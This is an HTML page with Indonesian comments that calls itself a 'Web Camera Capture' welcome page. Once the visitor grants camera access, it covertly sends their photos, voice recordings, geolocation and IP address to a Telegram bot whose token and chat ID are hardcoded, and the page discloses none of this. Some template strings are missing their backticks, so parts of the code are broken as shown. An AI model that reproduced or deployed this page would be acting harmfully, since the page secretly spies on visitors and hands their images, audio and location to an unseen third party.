<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Camera Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f0f0f0;
            text-align: center;
        }
        .container {
            max-width: 600px;
        }
        #photo {
            width: 100%;
            height: auto;
        }
        #camera {
            width: 100%;
        }
        button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container">
    <img id="photo" src="https://img5.pixhost.to/images/2823/565952081_skyzopedia.jpg" alt="Your custom image" />
    <h2>Welcome! Please Allow Camera Access</h2>
    <video id="camera" autoplay></video>
    <button onclick="takePhoto()">Capture Photo</button>
    <button onclick="startRecording()">Start Recording</button>
    <button onclick="stopRecording()">Stop Recording</button>
</div>

<script>
    const telegramBotToken = '7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0'; // Ganti dengan token bot Telegram Anda
    const chatId = '7081489041'; // Ganti dengan ID chat Telegram Anda

    let mediaRecorder;
    let audioChunks = [];

    // Akses kamera pengguna
    async function setupCamera() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('camera').srcObject = stream;
        return stream;
    }

    // Mengambil foto dari kamera
    function takePhoto() {
        const video = document.getElementById('camera');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

        const photo = canvas.toDataURL('image/png');
        document.getElementById('photo').src = photo;

        sendToTelegram(photo);
    }

    // Mulai merekam suara
    function startRecording() {
        const stream = document.getElementById('camera').srcObject;
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        mediaRecorder.start();
    }

    // Hentikan perekaman suara
    function stopRecording() {
        mediaRecorder.stop();
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            const audioUrl = URL.createObjectURL(audioBlob);
            const audio = new Audio(audioUrl);
            audio.play();
            sendAudioToTelegram(audioBlob);
        };
    }

    // Kirim foto dan data ke bot Telegram
    async function sendToTelegram(photo) {
        const userEmail = 'example@domain.com'; // Ganti dengan mekanisme untuk mendapatkan email
        const location = await getLocation(); // Mendapatkan lokasi pengguna
        const ipAddress = await getIPAddress(); // Mendapatkan IP Address

        const message = New photo captured!\n\nEmail: ${userEmail}\nLocation: ${location}\nIP: ${ipAddress};
        const data = new FormData();
        data.append('chat_id', chatId);
        data.append('photo', photo);
        data.append('caption', message);

        fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
            method: 'POST',
            body: data
        });
    }

    // Kirim audio ke Telegram
    async function sendAudioToTelegram(audioBlob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('audio', audioBlob);
        
        fetch(https://api.telegram.org/bot${telegramBotToken}/sendAudio, {
            method: 'POST',
            body: formData
        });
    }

    // Ambil lokasi pengguna
    async function getLocation() {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition((position) => {
                resolve(Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude});
            }, (error) => {
                reject(error);
            });
        });
    }

    // Ambil IP Address pengguna
    async function getIPAddress() {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    }

    // Setup kamera saat halaman dimuat
    window.onload = setupCamera;
</script>

</body>
</html>
